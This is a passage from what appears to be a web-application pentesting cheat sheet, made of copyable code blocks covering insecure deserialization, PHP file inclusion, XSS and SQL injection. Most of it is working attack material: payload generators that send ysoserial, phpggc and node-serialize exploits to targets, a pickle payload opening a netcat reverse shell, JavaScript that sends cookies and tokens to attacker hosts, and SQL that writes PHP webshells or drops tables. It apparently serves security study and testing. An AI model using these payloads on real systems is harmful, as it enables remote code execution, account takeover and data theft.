            <pre><code class="language-python">import websocket
import json

def on_message(ws, message):
    print(f"Received: {message}")

def on_error(ws, error):
    print(f"Error: {error}")

def on_close(ws, close_status_code, close_msg):
    print("Connection closed")

def on_open(ws):
    print("Connection opened")
    ws.send(json.dumps({"action": "example"}))

if __name__ == "__main__":
    websocket.enableTrace(True)
    ws = websocket.WebSocketApp("ws://example.com/ws",
                                on_open=on_open,
                                on_message=on_message,
                                on_error=on_error,
                                on_close=on_close)
    ws.run_forever()
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h3 id="forge-jwt">Forge JWT</h3>
        <div class="code-container">
            <pre><code class="language-python">import jwt
from datetime import datetime, timedelta, timezone

def forge_jwt(key, algorithm='HS256', payload=None):
    if payload is None:
        payload = {
            'sub': '1234567890',
            'name': 'John Doe',
            'iat': datetime.now(timezone.utc),
            'exp': datetime.now(timezone.utc) + timedelta(hours=1)
        }
    encoded_jwt = jwt.encode(payload, key, algorithm=algorithm)
    return encoded_jwt

if __name__ == "__main__":

    key = 'secret'
    algorithm = 'HS256'
    payload = {
        'sub': '1234567890',
        'name': 'John Doe',
        'iat': datetime.now(timezone.utc),
        'exp': datetime.now(timezone.utc) + timedelta(hours=1)
    }
    token = forge_jwt(key, algorithm, payload)
    print(f"Forged JWT: {token}")
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h3 id="get-current-time-epoch">Get Current Time (EPOCH)</h3>
        <div class="code-container">
            <pre><code class="language-python">import requests
from datetime import datetime
import time

def get_epoch_from_server():
    url = 'http://example.com'  # Replace with the target server URL or IP (e.g., 'http://192.168.1.1')
    try:
        response = requests.get(url)
        server_date_str = response.headers.get('Date')
        if server_date_str:
            # Parse the date string (e.g., 'Sun, 12 Oct 2025 00:00:00 GMT')
            server_date = datetime.strptime(server_date_str, '%a, %d %b %Y %H:%M:%S %Z')
            # Convert to epoch time
            epoch_time = int(time.mktime(server_date.timetuple()))
            print(f"Server's EPOCH time: {epoch_time}")
            return epoch_time
        else:
            print("No 'Date' header found in response.")
            return None
    except Exception as e:
        print(f"Error fetching server time: {e}")
        return None

get_epoch_from_server()
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h2 id="insecure-deserialization">Insecure Deserialization</h2>

        <h3 id="java">Java</h3>

        <h4 id="methods-and-classes">Methods and Classes</h4>
        <div class="code-container">
            <pre><code class="language-java">ObjectInputStream.readObject()</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>The primary method for deserializing objects in Java. It reads an object from an ObjectInputStream and reconstructs it.</p>
        <div class="code-container">
            <pre><code class="language-java">ObjectInputStream.readUnshared()</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>Similar to readObject(), but ensures the deserialized object is not shared with previously deserialized objects.</p>
        <div class="code-container">
            <pre><code class="language-java">ObjectInputStream.readResolve()</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>A special method that can be defined in a class to replace the deserialized object during deserialization.</p>
        <div class="code-container">
            <pre><code class="language-java">ObjectInputStream.defaultReadObject()</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>Used within a classâ€™s readObject() method to perform default deserialization of non-transient fields.</p>
        <div class="code-container">
            <pre><code class="language-java">XMLDecoder.readObject()</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>Used to deserialize objects from XML input, typically in JavaBeans-style XML.</p>
        <div class="code-container">
            <pre><code class="language-java">XStream.fromXML()</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>Part of the XStream library, used to deserialize objects from XML.</p>
        <div class="code-container">
            <pre><code class="language-java">ObjectMapper.readValue()</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>Part of the Jackson library, used to deserialize JSON or other formats into Java objects.</p>
        <div class="code-container">
            <pre><code class="language-java">Kryo.readObject()</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>Part of the Kryo serialization library, used for high-performance serialization/deserialization.</p>
        <div class="code-container">
            <pre><code class="language-java">SnakeYAML.load()</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>Part of the SnakeYAML library, used to deserialize YAML into Java objects.</p>

        <h4 id="identify-insecure-deserialization-in-source-code">Identify Insecure Deserialization in Source Code</h4>
        <p>When auditing source code, follow these steps to identify potential insecure deserialization vulnerabilities:</p>
        <p>Use code analysis tools (e.g., grep, IDE search, or static analysis tools like SonarQube) to find calls to the methods listed above (e.g., readObject, fromXML, readValue).</p>
        <p>Example grep command:</p>
        <div class="code-container">
            <pre><code class="language-bash">grep -r "readObject" .</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-bash">grep -r "XStream\.fromXML ."</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-bash">grep -r --include="*.java" -E '(ObjectInputStream\.readObject\(|ObjectInputStream\.readUnshared\(|readResolve\(|defaultReadObject\(|XMLDecoder|XStream\.fromXML\(|ObjectMapper\.readValue\(|Kryo\.readObject\(|Kryo\.readClassAndObject\(|Yaml\.load\(|HessianInput\.readObject\()' .</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-bash">grep -r --include="*.java" -C 10 -E '(ObjectInputStream\.readObject\(|ObjectInputStream\.readUnshared\(|readResolve\(|defaultReadObject\(|XMLDecoder|XStream\.fromXML\(|ObjectMapper\.readValue\(|Kryo\.readObject\(|Kryo\.readClassAndObject\(|Yaml\.load\(|HessianInput\.readObject\()' . | grep -E -B 10 -A 10 '(HttpServletRequest|System\.in|FileInputStream|FileReader|Socket|ServerSocket|getParameter|getInputStream|getReader|request\.|input\.|stream\.|data\.)'</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>For each deserialization method, trace the input source (e.g., FileInputStream, Socket, HttpServletRequest).</p>
        <p>Check if the input is untrusted (e.g., user-uploaded files, network data, or external API responses).</p>
        <p>Look for validation mechanisms, such as: Use of ObjectInputFilter (Java 9+) to restrict deserialized classes.</p>
        <p>Example:</p>
        <div class="code-container">
            <pre><code class="language-java">ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("allowed.package.*;!*");
ObjectInputStream ois = new ObjectInputStream(input);
ois.setObjectInputFilter(filter);
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>Identify classes implementing Serializable or Externalizable.</p>
        <p>Check for readObject(), readResolve(), or writeReplace() methods that could be exploited in gadget chains.</p>

        <h4 id="exploitation-template-in-python">Exploitation Template in Python</h4>
        <div class="code-container">
            <pre><code class="language-python">import os
import re
import base64
import urllib.parse
import requests

payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2',
            'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'Groovy1',
            'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21',
            'MozillaRhino1', 'Myfaces1', 'ROME', 'Spring1', 'Spring2']

def generate_payloads(name, cmd):
    for payload in payloads:
        final = cmd.replace('REPLACE', payload)
        print(f'Generating {payload} for {name}...')
        command = os.popen(f'java -jar ysoserial.jar {payload} "{final}"')
        result = command.read()
        command.close()
        encoded = base64.b64encode(result.encode('latin1'))  # Handle binary properly
        if encoded != b"":
            # Create line breaks at 76 characters
            encoded_str = encoded.decode('utf-8')
            encoded_str = re.sub("(.{76})", "\\1\n", encoded_str, 0, re.DOTALL)
            # Double URL encode the payload
            encoded_str = urllib.parse.quote_plus(urllib.parse.quote_plus(encoded_str))
            with open(f'{name}_{payload}_intruder.txt', 'a') as f:
                f.write(encoded_str + '\n')

def send_payload(target_url, payload_file, param_name):
    with open(payload_file, 'r') as f:
        payload = f.read().strip()
    data = {param_name: payload}
    response = requests.post(target_url, data=data)
    print(f"Response: {response.text}")

if __name__ == "__main__":

    command = 'ping -c 1 example.com'
    target_url = 'http://example.com/vuln'
    param_name = 'data'
    payload_type = 'CommonsCollections4'

    # Generate for Linux example
    generate_payloads('Linux', command)

    payload_file = f'Linux_{payload_type}_intruder.txt'
    send_payload(target_url, payload_file, param_name)
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h3 id="python-1">Python</h3>

        <h4 id="methods-and-classes-1">Methods and Classes</h4>
        <div class="code-container">
            <pre><code class="language-python">pickle.loads()</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>The primary method for deserializing pickled data in Python.</p>
        <div class="code-container">
            <pre><code class="language-python">pickle.load()</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>Deserializes from a file-like object.</p>
        <div class="code-container">
            <pre><code class="language-python">yaml.load() with UnsafeLoader</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>From PyYAML, can deserialize arbitrary objects if unsafe.</p>
        <div class="code-container">
            <pre><code class="language-python">jsonpickle.decode()</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>From jsonpickle library, deserializes JSON to Python objects.</p>

        <h4 id="identify-insecure-deserialization-in-source-code-1">Identify Insecure Deserialization in Source Code</h4>
        <p>Search for calls to <code>pickle.loads()</code>, <code>pickle.load()</code>, <code>yaml.load(..., Loader=yaml.UnsafeLoader)</code>, or similar.</p>
        <p>Trace if input is from untrusted sources like user input, files, or network.</p>
        <p>Check for lack of validation or safe loaders (e.g., use SafeLoader for YAML).</p>

        <h4 id="exploitation-template-in-python-1">Exploitation Template in Python</h4>
        <div class="code-container">
            <pre><code class="language-python">import pickle
import base64
import os
import requests

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f')
        return os.system, (cmd,)

def generate_payload():
    pickled = pickle.dumps(RCE())
    return base64.urlsafe_b64encode(pickled).decode('utf-8')

def send_payload(target_url, payload, param_name):
    data = {param_name: payload}
    response = requests.post(target_url, data=data)
    print(f"Response: {response.text}")

if __name__ == "__main__":

    target_url = 'http://example.com/vuln'
    param_name = 'pickled'

    payload = generate_payload()
    print(f"Generated Payload: {payload}")
    send_payload(target_url, payload, param_name)
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h3 id="php">PHP</h3>

        <h4 id="methods-and-classes-2">Methods and Classes</h4>
        <div class="code-container">
            <pre><code class="language-php">unserialize()</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>The primary function for deserializing serialized data in PHP.</p>
        <div class="code-container">
            <pre><code class="language-php">__wakeup()</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>Magic method called before deserialization.</p>
        <div class="code-container">
            <pre><code class="language-php">__destruct()</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>Magic method called when object is destroyed, often used in gadget chains.</p>
        <p>Libraries like Symfony, Laravel may have vulnerable gadgets.</p>

        <h4 id="identify-insecure-deserialization-in-source-code-2">Identify Insecure Deserialization in Source Code</h4>
        <p>Search for calls to <code>unserialize($_GET['data'])</code> or similar with user input.</p>
        <p>Look for magic methods like __destruct, __wakeup in classes.</p>
        <p>Check for lack of 'allowed_classes' option in unserialize.</p>

        <h4 id="exploitation-template-in-python-2">Exploitation Template in Python</h4>
        <div class="code-container">
            <pre><code class="language-python">import os
import base64
import requests
import urllib.parse

def generate_payload(gadget, command):
    print(f"Generating payload with {gadget}...")
    command = os.popen(f'./phpggc {gadget} "{command}"')
    result = command.read().strip()
    command.close()
    # Base64 encode if needed
    encoded = base64.b64encode(result.encode('utf-8')).decode('utf-8')
    # URL encode
    encoded = urllib.parse.quote_plus(encoded)
    return encoded

def send_payload(target_url, payload, param_name):
    data = {param_name: payload}
    response = requests.post(target_url, data=data)
    print(f"Response: {response.text}")

if __name__ == "__main__":

    gadget = 'Monolog/RCE1'
    command = 'id'
    target_url = 'http://example.com/vuln'
    param_name = 'data'

    payload = generate_payload(gadget, command)
    print(f"Generated Payload: {payload}")
    send_payload(target_url, payload, param_name)
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h3 id="nodejs">Node.js</h3>

        <h4 id="methods-and-classes-3">Methods and Classes</h4>
        <div class="code-container">
            <pre><code class="language-javascript">serialize.unserialize() from node-serialize</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>Vulnerable to RCE if using eval.</p>
        <p>Custom deserializers in libraries like funcster.</p>
        <p>Magic markers like _$$ND_FUNC$$_ for functions.</p>

        <h4 id="identify-insecure-deserialization-in-source-code-3">Identify Insecure Deserialization in Source Code</h4>
        <p>Search for require('node-serialize').unserialize(userInput).</p>
        <p>Look for eval or Function calls in deserialization logic.</p>
        <p>Check for untrusted input to unserialize functions.</p>

        <h4 id="exploitation-template-in-python-3">Exploitation Template in Python</h4>
        <div class="code-container">
            <pre><code class="language-python">import base64
import requests
import urllib.parse

def generate_payload(command):
    # Construct the node-serialize payload
    func = f"function(){{require('child_process').exec('{command}', function(error, stdout, stderr) {{ console.log(stdout) }});}}()"
    payload = f'{{"rce":"_$$ND_FUNC$$_{func}"}}'
    # Base64 encode
    encoded = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
    # URL encode if needed
    encoded = urllib.parse.quote_plus(encoded)
    return encoded

def send_payload(target_url, payload, param_name):
    data = {param_name: payload}
    response = requests.post(target_url, data=data)
    print(f"Response: {response.text}")

if __name__ == "__main__":

    command = 'ls /'
    target_url = 'http://example.com/vuln'
    param_name = 'data'

    payload = generate_payload(command)
    print(f"Generated Payload: {payload}")
    send_payload(target_url, payload, param_name)
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h2 id="file-inclusion-vulnerabilities-in-php">File Inclusion Vulnerabilities in PHP</h2>

        <h3 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h3>
        <p>LFI occurs when an application includes files based on user input without proper validation or sanitization. This can allow attackers to read sensitive local files.</p>
        <p>Common vulnerable code:</p>
        <div class="code-container">
            <pre><code class="language-php">include($_GET['page'] . '.php');</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>Configurations that enable/exacerbate LFI:</p>
        <ul>
            <li>No specific php.ini setting required, but open_basedir can restrict directories.</li>
            <li>If open_basedir is not set, attackers can traverse directories using ../</li>
        </ul>
        <p>Abuse strategies:</p>
        <ul>
            <li>Read sensitive files: ?page=../../../etc/passwd</li>
            <li>Use wrappers for code execution: ?page=php://filter/convert.base64-encode/resource=../../config.php (to read encoded source)</li>
            <li>Log poisoning: Inject PHP code into logs (e.g., via User-Agent) and include the log file: ?page=/var/log/apache2/access.log</li>
            <li>Data URI for RCE if allow_url_include=On: ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+</li>
        </ul>

        <h3 id="remote-file-inclusion-rfi">Remote File Inclusion (RFI)</h3>
        <p>RFI allows inclusion of remote files, leading to remote code execution if the included file contains malicious code.</p>
        <p>Common vulnerable code:</p>
        <div class="code-container">
            <pre><code class="language-php">include($_GET['page']);</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>Configurations that enable RFI:</p>
        <ul>
            <li>allow_url_fopen=On (default, allows remote file access)</li>
            <li>allow_url_include=On (allows include/require of remote files)</li>
        </ul>
        <p>Abuse strategies:</p>
        <ul>
            <li>Include remote shell: ?page=http://attacker.com/shell.txt (where shell.txt contains <?php system($_GET['cmd']); ?>)</li>
            <li>Bypass filters: Use null byte %00 if PHP < 5.3: ?page=http://attacker.com/shell.txt%00</li>
            <li>Combine with LFI for advanced attacks.</li>
        </ul>

        <h2 id="regex-cheatsheet">Regex Cheatsheet</h2>

        <h3 id="match-a-start-and-end-delimiter-in-rtext">Match a START and END Delimiter in r.text</h3>
        <div class="code-container">
            <pre><code class="language-python">import requests
import re

target = 'http://example.com'
headers = {}
xml = ''
proxies = {}

r = requests.post(target, headers=headers, data=xml, proxies=proxies)
match = re.search(f'{re.escape("START DELIMETER")}(.*?){re.escape("END DELIMETER")}', r.text, re.DOTALL)
print(match[1].strip())
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h3 id="extract-a-cookie-value-from-response-headers">Extract a Cookie Value from Response Headers</h3>
        <div class="code-container">
            <pre><code class="language-python">import requests
import re

target = 'http://example.com'
headers = {}
xml = ''
proxies = {}

r = requests.post(target, headers=headers, data=xml, proxies=proxies)
set_cookie = r.headers.get('Set-Cookie', '')
match = re.search(r'JSESSIONID=([A-Za-z0-9]+);', set_cookie)
print(match.group(1))
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h2 id="xss-payloads">XSS Payloads</h2>

        <h3 id="load-external-javascript">Load External JavaScript</h3>
        <div class="code-container">
            <pre><code class="language-html">&lt;img src="invalid-image" onerror="var script = document.createElement('script'); script.src='http://192.168.118.2/malicious.js'; document.body.appendChild(script);" /&gt;</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-html">&lt;img src=x onerror=eval(atob("&lt;BASE64 JAVASCRIPT PAYLOAD&gt;"))&gt;</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-html">&lt;audio onloadstart="var s=document.createElement('script');s.src='//192.168.45.163/worked.js';document.head.appendChild(s)"&gt;&lt;source&gt;&lt;/audio&gt;</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-html">&lt;iframe/srcdoc="&lt;script/src=//192.168.45.163/worked.js&gt;&lt;/script&gt;"&gt;</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-html">&lt;strong onafterscriptexecute=""&gt;&lt;script src="http://192.168.45.163/worked.js"&gt;&lt;/script&gt;&lt;/strong&gt;</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h3 id="load-inline-javascript">Load Inline JavaScript</h3>
        <div class="code-container">
            <pre><code class="language-html">&lt;audio onloadstart="setTimeout(atob('YWxlcnQoIlhTUyIp'))"&gt;&lt;source&gt;&lt;/audio&gt;</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-html">&lt;audio src=x onerror=Function(atob('YWxlcnQoIlhTUyIp'))()&gt;&lt;/audio&gt;</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-html">&lt;audio onloadstart="Function(atob('YWxlcnQoIlhTUyIp'))()"&gt;&lt;source&gt;&lt;/audio&gt;</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-html">&lt;video src=x onerror=eval(atob('YWxlcnQoIlhTUyIp'))&gt;&lt;/video&gt;</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h3 id="send-localstorage-token-value-from-user-key-to-remote-resource">Send localStorage Token Value from User Key to Remote Resource</h3>
        <div class="code-container">
            <pre><code class="language-javascript">fetch(`http://192.168.45.159/data?data=${encodeURIComponent(JSON.parse(localStorage.getItem('user')).token)}`, {mode: 'no-cors'});
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h3 id="leverage-xss-to-csrf">Leverage XSS to CSRF</h3>
        <p>Grab csrftoken and send HTTP request including csrftoken in the request:</p>
        <div class="code-container">
            <pre><code class="language-javascript">var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h3 id="filter-specific-cookie-value-and-send-it-back">Filter Specific Cookie Value and Send It Back</h3>
        <div class="code-container">
            <pre><code class="language-javascript">function getCookieValue(name) {
    const cookieString = document.cookie;
    const cookies = cookieString.split('; ');
    for (let cookie of cookies) {
        const [key, value] = cookie.split('=');
        if (key === name) return value;
    }
    return null;
}

// Specify the cookie name you want to retrieve (replace 'auth' with your actual cookie name)
const cookieName = 'token';
const cookieValue = getCookieValue(cookieName);

var req2 = new XMLHttpRequest();
req2.open('GET', 'http://192.168.45.163/' + (cookieValue || ''), false);
req2.send();
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h3 id="send-request-to-specific-endpoint-with-custom-header-and-send-response-back">Send Request to Specific Endpoint with Custom Header and Send Response Back</h3>
        <div class="code-container">
            <pre><code class="language-javascript">function getCookieValue(name) {
    const cookieString = document.cookie;
    const cookies = cookieString.split('; ');
    for (let cookie of cookies) {
        const [key, value] = cookie.split('=');
        if (key === name) return value;
    }
    return null;
}

// Specify the cookie name you want to retrieve (replace 'auth' with your actual cookie name)
const cookieName = 'token';
const cookieValue = getCookieValue(cookieName);

// Send request using the token
var req = new XMLHttpRequest();
req.open('GET', 'http://192.168.136.243:8000/user/groups', false);
req.setRequestHeader('authorization', 'Bearer ' + token);
req.send();
var response = req.responseText;

// Send back the response to us
var req2 = new XMLHttpRequest();
req2.open('GET', 'http://192.168.45.163/' + btoa(response), true);
req2.send();
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h2 id="sql-injection-cheatsheet">SQL Injection Cheatsheet</h2>

        <h3 id="general-sql-injection-payloads">General SQL Injection Payloads</h3>
        <div class="code-container">
            <pre><code class="language-sql">' UNION SELECT 1,2,3 -- -</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">' OR 1=1 GROUP BY column_name HAVING 1=1 -- -</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">' AND 1=1 -- -</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">' AND 1=2 -- -</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">'; DROP TABLE users; -- -</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h3 id="postgres-specific">Postgres Specific</h3>
        <p>Postgres SQL Injection Payloads:</p>
        <div class="code-container">
            <pre><code class="language-sql">' AND (SELECT pg_sleep(5)) -- -</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">' UNION SELECT version() -- -</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">' UNION SELECT datname FROM pg_database -- -</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">' UNION SELECT schema_name FROM information_schema.schemata -- -</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public' -- -</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' -- -</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">' UNION SELECT username,password FROM users -- -</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">' UNION SELECT COPY (SELECT '&lt;?php system($_GET["cmd"]); ?&gt;') TO '/var/www/html/shell.php' -- -</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">' UNION SELECT lo_export(lo_create('\x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e'), '/var/www/html/shell.php') -- -</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>Basic Postgres Commands:</p>
        <div class="code-container">
            <pre><code class="language-sql">SELECT datname FROM pg_database;</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'your_table';</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">SELECT * FROM your_table;</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">INSERT INTO your_table (column1, column2) VALUES ('value1', 'value2');</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">UPDATE your_table SET column1 = 'new_value' WHERE condition_column = 'condition_value';</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">DELETE FROM your_table WHERE condition_column = 'condition_value';</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">DROP TABLE your_table;</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">SELECT current_user;</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">SELECT version();</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">SELECT pg_sleep(5);</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">SELECT pg_read_file('/etc/passwd');</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">COPY (SELECT 'data') TO '/tmp/test.txt';</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">CREATE EXTENSION IF NOT EXISTS plperlu; SELECT system('ls');</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">SELECT schema_name FROM information_schema.schemata;</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">SELECT usename FROM pg_user;</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">SELECT current_database();</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>Postgres Database Shortcuts (psql meta-commands):</p>
        <div class="code-container">
            <pre><code class="language-bash">\l</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>List all databases</p>
        <div class="code-container">
            <pre><code class="language-bash">\c database_name</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>Connect to a database</p>
        <div class="code-container">
            <pre><code class="language-bash">\dt</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>List all tables in the current database</p>
        <div class="code-container">
            <pre><code class="language-bash">\d table_name</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>Describe a table (columns, types, etc.)</p>
        <div class="code-container">
            <pre><code class="language-bash">\du</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>List all users and roles</p>
        <div class="code-container">
            <pre><code class="language-bash">\dn</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>List all schemas</p>
        <div class="code-container">
            <pre><code class="language-bash">\q</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>Quit psql</p>

        <h3 id="mysql-specific">MySQL Specific</h3>
        <p>MySQL SQL Injection Payloads:</p>
        <div class="code-container">
            <pre><code class="language-sql">' AND SLEEP(5) -- -</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">' UNION SELECT @@version -- -</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() -- -</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' -- -</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">' UNION SELECT "&lt;?php system($_GET['cmd']); ?&gt;" INTO OUTFILE '/var/www/html/shell.php' -- -</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">' UNION SELECT "&lt;?php system($_GET['cmd']); ?&gt;" INTO DUMPFILE '/var/www/html/shell.php' -- -</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-sql">INSERT INTO users (id, name) VALUES (1, 'test') INTO OUTFILE '/tmp/test.txt' -- -</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>Use comments like <code>/*comment*/</code>, case variations, or encodings like <code>UN/**/ION SEL/**/ECT</code>.</p>

        <h2 id="javascript-code-snippets">JavaScript Code Snippets</h2>

        <h3 id="basic-fetch-request">Basic Fetch Request</h3>
        <div class="code-container">
            <pre><code class="language-javascript">fetch('https://example.com/api/data')
  .then(response => {
    if (!response.ok) {
      throw new Error('Network response was not ok');
    }
    return response.json();
  })
  .then(data => console.log(data))
  .catch(error => console.error('Error:', error));
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h3 id="fetch-with-headers-and-body">Fetch with Headers and Body</h3>
        <div class="code-container">
            <pre><code class="language-javascript">fetch('https://example.com/api/post', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer your-token-here'
  },
  body: JSON.stringify({
    key: 'value',
    anotherKey: 'anotherValue'
  })
})
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error('Error:', error));
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h3 id="fetch-cookies-and-send-to-remote">Fetch Cookies and Send to Remote</h3>
        <div class="code-container">
            <pre><code class="language-javascript">fetch('http://attacker.com/steal?c=' + encodeURIComponent(document.cookie), {
  mode: 'no-cors'
